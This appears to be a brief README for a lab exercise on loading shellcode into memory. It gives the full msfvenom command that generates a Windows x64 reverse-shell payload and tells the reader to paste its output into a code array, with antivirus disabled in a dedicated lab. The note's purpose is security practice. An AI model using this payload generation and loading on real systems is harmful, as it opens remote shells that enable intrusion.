To test this effectively run msfvenom -p windows/x64/shell_reverse_tcp LHOST=YourIpAddress LPORT=DesiredPort -f c and copy that
into the Talktome array. The point of this code was not to evade AV/EDR so make sure you practice in a dedicated lab environment 
with it off. This is not an effective way to get a reverse shell using the .text binary this is mostly to test effectively allocating
the payload to memory and printing the address.